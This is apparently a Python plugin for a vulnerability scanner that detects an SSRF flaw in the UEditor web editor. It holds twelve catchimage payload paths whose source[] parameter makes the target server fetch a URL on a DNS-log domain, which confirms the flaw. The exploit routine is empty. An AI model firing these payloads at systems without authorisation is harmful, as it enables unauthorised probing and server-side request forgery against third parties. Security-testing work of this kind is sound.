#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
Ueditor编辑器 SSRF漏洞
    暂无编号
        Payload: https://baizesec.github.io/bylibrary/%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Ueditor/Ueditor%E7%BC%96%E8%BE%91%E5%99%A81.4.3.3%E7%89%88%E6%9C%ACssrf%E6%BC%8F%E6%B4%9E/

该接口用于抓取远程图片, 如果没有进行过滤, 则可以请求任意url地址
'''

from lib.api.dns import dns
from lib.tool.md5 import random_md5
from PluginManager import Vuln_Scan

class Scan(Vuln_Scan):
    def __init__(self):
        self.randomFileName = random_md5(6)

        self.payloads = [
            {'path': 'ueditor/php/controller.php?action=catchimage&source[]=http://{DNSDOMAIN}/{FILENAME}.jpg'},
            {'path': 'ueditor/jsp/controller.jsp?action=catchimage&source[]=http://{DNSDOMAIN}/{FILENAME}.jpg'},
            {'path': 'ueditor/asp/controller.asp?action=catchimage&source[]=http://{DNSDOMAIN}/{FILENAME}.jpg'},
            {'path': 'ueditor/net/controller.ashx?action=catchimage&source[]=http://{DNSDOMAIN}/{FILENAME}.jpg'},
            {'path': 'UEditor/php/controller.php?action=catchimage&source[]=http://{DNSDOMAIN}/{FILENAME}.jpg'},
            {'path': 'UEditor/jsp/controller.jsp?action=catchimage&source[]=http://{DNSDOMAIN}/{FILENAME}.jpg'},
            {'path': 'UEditor/asp/controller.asp?action=catchimage&source[]=http://{DNSDOMAIN}/{FILENAME}.jpg'},
            {'path': 'UEditor/net/controller.ashx?action=catchimage&source[]=http://{DNSDOMAIN}/{FILENAME}.jpg'},
            {'path': 'php/controller.php?action=catchimage&source[]=http://{DNSDOMAIN}/{FILENAME}.jpg'},
            {'path': 'jsp/controller.jsp?action=catchimage&source[]=http://{DNSDOMAIN}/{FILENAME}.jpg'},
            {'path': 'asp/controller.asp?action=catchimage&source[]=http://{DNSDOMAIN}/{FILENAME}.jpg'},
            {'path': 'net/controller.ashx?action=catchimage&source[]=http://{DNSDOMAIN}/{FILENAME}.jpg'},
        ]
    
    def POC(self, clients):
        client = clients.get('reqClient')
        sessid = 'ed446d2ac00eae0a1aed7c3aa45479d1'

        vul_info = {
            'app_name': 'Ueditor',
            'vul_type': 'SSRF',
            'vul_id': 'ueditor-ssrf',
        }

        for payload in self.payloads:
            md = random_md5()                                       # * 随机md5值, 8位
            dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

            path = payload['path'].format(DNSDOMAIN=dns_domain, FILENAME=self.randomFileName)

            res = client.request(
                'get',
                path,
                vul_info=vul_info
            )

            if ((dns.result(md, sessid))):
                results = {
                    'Target': res.request.url,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res,
                }
                return results
        return None
    
    def EXP(self, clients):
        pass

    def Start(self, clients):
        return self.POC(clients)
